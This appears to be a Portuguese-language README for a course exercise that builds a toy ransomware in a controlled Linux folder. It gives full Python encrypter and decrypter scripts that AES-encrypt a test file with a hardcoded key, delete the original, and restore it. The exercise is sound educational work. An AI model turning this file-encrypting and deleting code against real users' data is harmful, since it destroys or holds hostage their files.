# projeto_ransomware_DIO
Desafio ransomware Dio ciberseguranca

DESAFIO RANSOMWARE

	Em um ambiente controlado vamos realizar o necessario para testar um ransomware criado
	em ambiente linux.
	Todos os prints ilustrativos estão em uma pasta junto do repositorio enumeradas conforme descrito abaixo.
	
	# Vamos criar uma pasta para isolar o teste: [print 01]
		mkdir -p projeto/ransomware
		
	# Dentro desta pasta vamos fazer os 3 arquivos necessarios para testar o ransomware. [print 02]
		> touch teste.txt [contendo um texto qualquer para ser o alvo]
		> touch encrypter.py [será o agente malicioso para fazer a ação de criptografia]
		> touch decrypter.py [será o antidoto para o agente malicioso]
		
	# No arquivo teste.txt escreva um texto qualquer:
		> nano teste.txt [print 03]
		>> Este arquivo esta legivel sem criptografia [print 04]
		
	# Para criar o arquivo de criptografar e descriptografar vc precisa instalar a 
	biblioteca do python "pyaes" com o seguinte comando: [antes, fazer algumas verificacoes necessarias]
		> sudo apt update
		> sudo apt install python3-pip
		> sudo apt install python3-pyaes [print 05]
		
	# Proximo passo eh criar o arquivo 'encrypter.py' pelo comando 'nano encrypter.py' 
		[print 06]
		> import os
		> import pyaes
		
		## abrir o arquivo a ser criptografado
		> file_name = 'teste.txt'
		> file = open(file_name, 'rb')
		> file_data = file.read()
		> file.close()
		
		## remover o arquivo original
		> os.remove(file_name)
		
		## definir a chave de encriptacao
		> key = b"testeransomwares"
		> aes = pyaes.AESModeOfOperationCTR(key)
		
		## criptografar o arquivo
		> crypto_data = aes.encrypt(file_data)
		
		## salvar o criptografado
		> new_file = file_name + '.ransomwaretroll'
		> new_file = open(f'{new_file}', 'wb')
		> new_file.write(crypto_data)
		> new_file.close()
		
	# Proximo passo eh criar o arquivo 'decrypter.py' pelo comando 'nano decrypter.py'
		[print 07]
		> import os
		> import pyaes
		
		## abrir o arquivo criptografado
		> file_name = 'teste.txt.ransomwaretroll'
		> file = open(file_name, 'rb')
		> file_data = file.read()
		> file.close()
		
		## chave de descriptografia
		> key = b"testeransomwares"
		> aes = pyaes.AESModeOfOperationCTR(key)
		> decrypt_data = aes.decrypt(file_data)
		
		## remover o arquivo original
		> os.remove(file_name)
		
		## salvar o novo arquivo descriptografado
		> new_file = 'teste.txt'
		> new_file = open(f'{new_file}', 'wb')
		> new_file.write(decrypt_data)
		> new_file.close()
		
		
	# Apos criado os arquivos, execute o arquivo encrypter.py [print 08]
	# Logo verifique a pasta e ira perceber a mudanca no arquivo teste.txt contendo uma extensao no nome "teste.txt.ransomwaretroll" [print 09]
	# Abra o arquivo e verifique que o conteudo do arquivo esta criptografado [print 10 e 11]
	# Execute o arquivo 'decrypter.py' para desfazer a acao. [print 12]
	# Verifique novamente a pasta e verá o arquivo 'texte.txt' voltar ao normal sem a extensão maliciosa. [print 13]
	# Agora abra o arquivo 'teste.txt' e veja que o texto voltou a integridade. [print 14]
		
